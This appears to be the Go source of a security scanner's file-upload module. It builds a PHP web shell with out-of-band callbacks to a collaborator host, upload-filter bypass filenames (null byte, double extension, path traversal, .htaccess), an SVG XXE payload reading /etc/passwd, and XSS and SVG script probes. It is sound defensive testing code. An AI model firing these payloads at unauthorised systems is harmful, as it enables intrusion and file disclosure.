package file_upload_scan

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
)

// uploadProbe defines a single file upload test case.
type uploadProbe struct {
	name        string
	filename    string
	contentType string
	body        string
	probeType   string // "rce", "xxe", "xss"
}

// generateMarker creates a unique marker for each scan to verify upload execution.
func generateMarker() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return "vigolium-upload-test-" + hex.EncodeToString(b)
}

// markerExecSignature is the exact string an executing PHP interpreter prints for
// the arithmetic web shell: the marker, the computed product 6*7, then the marker
// again. This string appears ONLY when the server evaluates the PHP — the raw
// source (…"MARKER".(6*7)."MARKER"…) never contains the markers adjacent to 42 — so
// finding it in a retrieved file is proof of code EXECUTION, not merely of storage.
func markerExecSignature(marker string) string {
	return marker + "42" + marker
}

// phpWebShell returns a PHP payload carrying up to three independent execution
// proofs:
//   - an arithmetic echo whose output is markerExecSignature(marker) only when the
//     interpreter runs it — this proves execution with no out-of-band channel and
//     even before any file is retrieved;
//   - an fsockopen HTTP request to the collaborator host — proof of outbound egress;
//   - a gethostbyname lookup — proof of DNS-only egress.
//
// The OAST legs are emitted only when oastHost is set, so with no collaborator the
// shell still carries the arithmetic proof.
func phpWebShell(marker, oastHost string) string {
	echo := fmt.Sprintf(`<?php echo "%s".(6*7)."%s";`, marker, marker)
	if oastHost == "" {
		return echo + " ?>"
	}
	// Best-effort, error-suppressed egress so a partially-restricted host still fires
	// whichever channel it allows.
	return echo + fmt.Sprintf(
		` @$f=fsockopen("%s",80,$e,$s,5); if($f){@fwrite($f,"GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n");@fclose($f);} @gethostbyname("%s"); ?>`,
		oastHost, oastHost, oastHost,
	)
}

// buildProbes creates the set of upload probes with a unique marker. When oastHost
// is non-empty (a collaborator is configured) the PHP shell carries out-of-band
// callbacks and an extra SVG probe with a render-time callback is appended, so an
// upload that executes or renders but is not directly retrievable is still proven.
func buildProbes(marker, oastHost string) []uploadProbe {
	phpBody := phpWebShell(marker, oastHost)
	svgBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text x="0" y="20">%s &xxe;</text>
</svg>`, marker)
	htmlBody := fmt.Sprintf(`<html><body><script>document.write('%s')</script></body></html>`, marker)

	probes := []uploadProbe{
		{
			name:        "Direct PHP",
			filename:    "test.php",
			contentType: "application/x-php",
			body:        phpBody,
			probeType:   "rce",
		},
		{
			name:        "Double Extension",
			filename:    "test.php.jpg",
			contentType: "image/jpeg",
			body:        phpBody,
			probeType:   "rce",
		},
		{
			name:        "Null Byte",
			filename:    "test.php%00.jpg",
			contentType: "image/jpeg",
			body:        phpBody,
			probeType:   "rce",
		},
		{
			name:        "Case Variation",
			filename:    "test.pHp",
			contentType: "application/x-php",
			body:        phpBody,
			probeType:   "rce",
		},
		{
			name:        "Magic Bytes (JPEG header + PHP)",
			filename:    "test.php",
			contentType: "image/jpeg",
			body:        "\xff\xd8\xff\xe0" + phpBody, // JPEG magic bytes + PHP code
			probeType:   "rce",
		},
		{
			name:        "SVG XXE",
			filename:    "test.svg",
			contentType: "image/svg+xml",
			body:        svgBody,
			probeType:   "xxe",
		},
		{
			name:        "HTML XSS",
			filename:    "test.html",
			contentType: "text/html",
			body:        htmlBody,
			probeType:   "xss",
		},
		{
			name:        ".htaccess Upload",
			filename:    ".htaccess",
			contentType: "application/octet-stream",
			body:        "AddType application/x-httpd-php .txt",
			probeType:   "rce",
		},
		{
			name:        "PHTML Extension",
			filename:    "test.phtml",
			contentType: "application/x-php",
			body:        phpBody,
			probeType:   "rce",
		},
		{
			name:        "PHAR Extension",
			filename:    "test.phar",
			contentType: "application/x-php",
			body:        phpBody,
			probeType:   "rce",
		},
		{
			name:        "Path Traversal Filename",
			filename:    "../test.php",
			contentType: "application/x-php",
			body:        phpBody,
			probeType:   "rce",
		},
	}

	// SVG with a render-time out-of-band callback. Unlike the SVG XXE probe (which
	// returns file content in the retrieved image), this one confirms only when the
	// stored SVG is later rendered/previewed by the application or a victim, so it is
	// OAST-confirmed rather than retrieval-confirmed and is added only when a
	// collaborator host is available.
	if oastHost != "" {
		probes = append(probes, uploadProbe{
			name:        "SVG OAST",
			filename:    "test.svg",
			contentType: "image/svg+xml",
			body: fmt.Sprintf(
				`<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg"><script>(new(Image)).src="//%s"</script></svg>`,
				oastHost,
			),
			probeType: "oast",
		})
	}

	return probes
}
